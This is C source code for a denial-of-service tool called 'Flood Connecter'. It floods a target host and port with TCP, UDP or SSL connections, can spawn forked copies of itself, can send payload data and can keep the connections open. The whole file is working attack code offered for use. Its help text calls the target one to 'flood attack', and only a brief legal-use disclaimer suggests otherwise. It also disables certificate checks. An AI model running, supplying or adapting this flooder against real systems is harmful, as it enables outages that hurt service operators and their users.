/*
 * Flood Connecter v1.2 (c) 2015 by Dfarje / Dfarje <rockwilder101@gmail.com>
 *
 * ----------------------------------------------------------------------------
 * "THE BEER-WARE LICENSE" (Revision 42):
 * <rockwilder101@gmail.com> wrote this file.  As long as you retain this notice you
 * can do whatever you want with this stuff. If we meet some day, and you think
 * this stuff is worth it, you can buy me a beer in return.
 * ----------------------------------------------------------------------------
 *
 * Connection flooder, can also send data, keep connections open.  Beware that
 * connections are done through the OS using connect() system call.  OS Memory
 * limitations apply.  A better approach would be to inject packets using the 
 * DPDK type of interface.
 * 
 * Will update this program to leverage DPDK KNI to perform packet injection
 *
 *
 * Use allowed only for legal purposes.
 *
 * To compile:   cc -o cflooder -O2 cflooder.c
 * openssl: cc -o cflooder -O2 cflooder.c -DOPENSSL -lssl -lcrypt
 * will try to make update to use GnuTLS
 */

#include <stdio.h>
#include <string.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>

#define PORT        80  // change this if you want
#define UNLIMITED   0	// dont change this

#ifdef OPENSSL
 #include <openssl/ssl.h>
 #include <openssl/err.h>
 SSL     *ssl = NULL;
 SSL_CTX *sslContext = NULL;
 RSA     *rsa = NULL;

 RSA *ssl_temp_rsa_cb(SSL *ssl, int export, int keylength) {
    if (rsa == NULL)
        rsa = RSA_generate_key(512, RSA_F4, NULL, NULL);
    return rsa;
 }
#endif

char *prg;
int   forks = 0;
int   pids[256];
int   warn = 0;

void help() {
    printf("Flood Connect v1.2 (c) 2015 by Dfarje <rockwilder101@gmail.com>\n"

"Syntax: %s [-S] [-u] [-p port] [-i file] [-n connects] [-N delay] [-c] [-C delay] [-d] [-D delay] [-e] [-k] [-v] TARGET\n"

"Options:\n"
   "-S           use SSL after TCP connect (not usuable with -u, sets port=443)\n"
   "-u           use UDP protocol (default: TCP) (not usable with -c)\n"
   "-p port      port to connect to (default: %d)\n"
   "-f forks     number of forks to additionally spawn (default: 0)\n"
   "-i file      data to send to the port (default: none)\n"
   "-n connects  maximum number of connects (default: unlimited)\n"
   "-N delay     delay between connects in ms (default: 0)\n"
   "-c           close after connect (and sending data, if used with -i)\n"
                 "use twice to shutdown SSL sessions hard (-S -c -c)\n"
   "-C delay     delay before closing the port (for use with -c) (default: 0)\n"
   "-d           dump data read from server\n"
   "-D delay     delay before trying to read+dump data from server (default: 0)\n"
   "-e           stop when no more connects possible (default: retry forever)\n"
   "-k           no keep-alive after finnishing with connects, terminate!\n"
   "-v           verbose mode\n"
   "TARGET       target to flood attack (ip or dns)\n"

"Connection flooder. Nothing more to say. Use only allowed for legal purposes.\n"
, prg, PORT);
    exit(-1);
}

void kill_children(int signo) {
    int i = 0;
    while (i < forks) {
        kill(pids[i], SIGTERM);
        i++;
    }
    usleep(10000);
    i = 0;
    while (i < forks) {
        kill(pids[i], SIGKILL);
        i++;
    }
    exit(-1);
}

int main(int argc, char *argv[]) {
    unsigned short int  port = PORT;
    long int max_connects = UNLIMITED;
    int      verbose = 0;
    int      close_connection = 0;
    int      exit_on_sock_error = 0;
    int      use_ssl = 0;
    int      keep_alive = 1;
    int      debug = 0;
    int      dump = 0;
    long int connect_delay = 0, close_delay = 0, dump_delay = 0;
    char    *infile = NULL;
    struct   stat st;
    FILE    *f = NULL;
    char    *str = NULL;
    int      str_len = 0;
    int      i;
    int      s;
    int      ret;
    int      err;
    int      client = 0;
    int      reads;
    int      sock_type = SOCK_STREAM;
    int      sock_protocol = IPPROTO_TCP;
    char     buf[8196];
    long int count, successful;
    struct sockaddr_in target;
    struct hostent    *resolv;
    struct rlimit      rlim;
    int      pidcount = 0, res = 0;

    prg = argv[0];
    err = 0;

    if (argc < 2 || strncmp(argv[1], "-h", 2) == 0)
        help();

    while ((i = getopt(argc, argv, "cf:C:dD:N:ei:kn:p:SuvV")) >= 0) {
        switch (i) {
            case 'c': close_connection++; break;
            case 'f': forks = atoi(optarg); break;
            case 'N': connect_delay = atol(optarg); break;
            case 'C': close_delay = atol(optarg); break;
            case 'D': dump_delay = atol(optarg); break;
            case 'd': dump = 1; break;
            case 'e': exit_on_sock_error = 1; break;
            case 'u': sock_type = SOCK_DGRAM;
                      sock_protocol = IPPROTO_UDP;
                      break;
            case 'v': verbose = 1; break;
            case 'V': debug = 1; break;
            case 'i': infile = optarg; break;
            case 'k': keep_alive = 0; break;
            case 'n': max_connects = atol(optarg); break;
            case 'S': use_ssl = 1;
                      if (port == PORT)
                          port = 443;
#ifndef OPENSSL
                      fprintf(stderr, "Error: Not compiled with openssl support, use -DOPENSSL -lssl\n");
                      exit(-1);
#endif
                      break;
            case 'p': if (atoi(optarg) < 1 || atoi(optarg) > 65535) {
                          fprintf(stderr, "Error: port must be between 1 and 65535\n");
                          exit(-1);
                      }
                      port = atoi(optarg) % 65536;
                      break;
            default: fprintf(stderr,"Error: unknown option -%c\n", i); help();
        }
    }

    if (optind + 1 != argc) {
        fprintf(stderr, "Error: target missing or too many commandline options!\n");
        exit(-1);
    }

    if (infile != NULL) {
        if ((f = fopen(infile, "r")) == NULL) {
            fprintf(stderr, "Error: can not find file %s\n", infile);
            exit(-1);
        }
        fstat(fileno(f), &st);
        str_len = (int) st.st_size;
        str = malloc(str_len);
        fread(str, str_len, 1, f);
        fclose(f);
    }

    if ((resolv = gethostbyname(argv[argc-1])) == NULL) {
        fprintf(stderr, "Error: can not resolve target\n");
        exit(-1);
    }
    memset(&target, 0, sizeof(target));
    memcpy(&target.sin_addr.s_addr, resolv->h_addr, 4);
    target.sin_port = htons(port);
    target.sin_family = AF_INET;

    if (connect_delay > 0)
        connect_delay = connect_delay * 1000; /* ms to microseconds */
    else
        connect_delay = 1;
    if (close_delay > 0)
        close_delay = close_delay * 1000; /* ms to microseconds */
    else
        close_delay = 1;
    if (dump_delay > 0)
        dump_delay = dump_delay * 1000; /* ms to microseconds */
    else
        dump_delay = 1;

    rlim.rlim_cur = RLIM_INFINITY;
    rlim.rlim_max = RLIM_INFINITY;
    ret = setrlimit(RLIMIT_NOFILE, &rlim);
    if (verbose) {
        if (ret == 0)
            printf("setrlimit for unlimited filedescriptors succeeded.\n");
        else
            printf("setrlimit for unlimited filedescriptors failed.\n");
    }

    for (i = 3; i < 4096; i++)
        close(i);

    printf("Starting flood connect attack on %s port %d\n", inet_ntoa((struct in_addr)target.sin_addr), port);
    (void) setvbuf(stdout, NULL, _IONBF, 0);
    if (verbose)
        printf("Writing a \".\" for every 100 connect attempts\n");

    ret = 0;
    count = 0;
    successful = 0;
    i = 1;
    s = -1;
    res = 1;

    while(pidcount < forks && res) {
        res = pids[pidcount] = fork();
        pidcount++;
    }

    if (res == 0)
        client = 1;

    if (res > 0) {
        signal(SIGTERM, kill_children);
        signal(SIGINT, kill_children);
        signal(SIGSEGV, kill_children);
        signal(SIGHUP, kill_children);
    }

    if (use_ssl) {
#ifdef OPENSSL
        SSL_load_error_strings();
        SSLeay_add_ssl_algorithms();

        // context: ssl2 + ssl3 is allowed, whatever the server demands
        if ((sslContext = SSL_CTX_new(SSLv23_method())) == NULL) {
            if (verbose) {
                err = ERR_get_error();
                fprintf(stderr, "SSL: Error allocating context: %s\n", ERR_error_string(err, NULL));
            }
            res = -1;
        }

        // set the compatbility mode
        SSL_CTX_set_options(sslContext, SSL_OP_ALL);

        // we set the default verifiers and dont care for the results
        (void) SSL_CTX_set_default_verify_paths(sslContext);
        SSL_CTX_set_tmp_rsa_callback(sslContext, ssl_temp_rsa_cb);
        SSL_CTX_set_verify(sslContext, SSL_VERIFY_NONE, NULL);
#endif
    }

    while (count < max_connects || max_connects == UNLIMITED) {
        if (ret >= 0) {
            if ((s = socket(AF_INET, sock_type, sock_protocol)) < 0) {
                if (verbose && warn == 0) {
                    perror("Warning (socket)");
                    warn = 1;
                }
                if (exit_on_sock_error)
                    exit(0);
            } else {
               setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &i, sizeof(i));
            }
        }
        if (s >= 0) {
            ret = connect(s, (struct sockaddr *)&target, sizeof(target));
            if (use_ssl && ret >= 0) {
#ifdef OPENSSL
                if ((ssl = SSL_new(sslContext)) == NULL) {
                    if (verbose) {
                        err = ERR_get_error();
                        fprintf(stderr, "Error preparing an SSL context: %s\n", ERR_error_string(err, NULL));
                    }
                    ret = -1;
                } else
                    SSL_set_fd(ssl, s);
                if (ret >= 0 && SSL_connect(ssl) <= 0) {
                    printf("ERROR %d\n", SSL_connect(ssl));
                    if (verbose) {
                        err = ERR_get_error();
                        fprintf(stderr, "Could not create an SSL session: %s\n", ERR_error_string(err, NULL));
                    }
                    ret = -1;
                }

                if (debug)
                    fprintf(stderr, "SSL negotiated cipher: %s\n", SSL_get_cipher(ssl));
#endif
            }
            count++;
            if (ret >= 0) {
                successful++;
                warn = 0;
                if (str_len > 0) {
                    if (use_ssl) {
#ifdef OPENSSL
                        SSL_write(ssl, str, str_len);
#endif
                    } else {
                    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &i, sizeof(i));
                        if (setsockopt(s, SOL_TCP, TCP_NODELAY, &i, sizeof(i)) != 0)
                            perror("Warning (setsockopt SOL_TCP)");
                        write(s, str, str_len);
                    }
                }
                if (dump) {
                    fcntl(s, F_SETFL, O_NONBLOCK);
                    if (dump_delay > 0)
                        usleep(dump_delay);
                    if (use_ssl) {
#ifdef OPENSSL
                        reads = SSL_read(ssl, buf, sizeof(buf));
#endif
                    } else {
                        reads = read(s, buf, sizeof(buf));
                    }
                    if (reads > 0)
                        printf("DATA: %s\n", buf);
                }
                if (close_connection) {
                    if (close_delay > 0)
                        usleep(close_delay);
#ifdef OPENSSL
                    if (use_ssl && close_connection == 1)
                        SSL_shutdown(ssl);
#endif
                    close(s);
#ifdef OPENSSL
                    if (use_ssl && close_connection > 1)
                        SSL_shutdown(ssl);
#endif
                }
                if (connect_delay > 0)
                    usleep(connect_delay);
            } else {
                if (verbose && warn == 0) {
                    perror("Warning (connect)");
                    warn = 1;
                }
                if (exit_on_sock_error)
                    exit(0);
            }
            if (verbose)
                if (count % 100 == 0)
                    printf(".");
        } else
            close(s);
    }
    if (client) {
        while (1) {}
    } else {
        if (verbose)
            printf("\n");
        printf("Done (made %s%ld successful connects)\n", forks ? "approx. " : "", successful + successful * forks);
        if (keep_alive && close_connection == 0) {
            printf("Press <ENTER> to terminate connections and this program\n");
            (void) getc(stdin);
        }

	if (forks > 0) {
	    usleep(1 + connect_delay + dump_delay + close_delay);
            while (i < forks) {
                kill(pids[i], SIGTERM);
                i++;
            }
	    usleep(10000);
	    i = 0;
            while (i < forks) {
                kill(pids[i], SIGKILL);
                i++;
            }
        }
    }
    return 0;
}
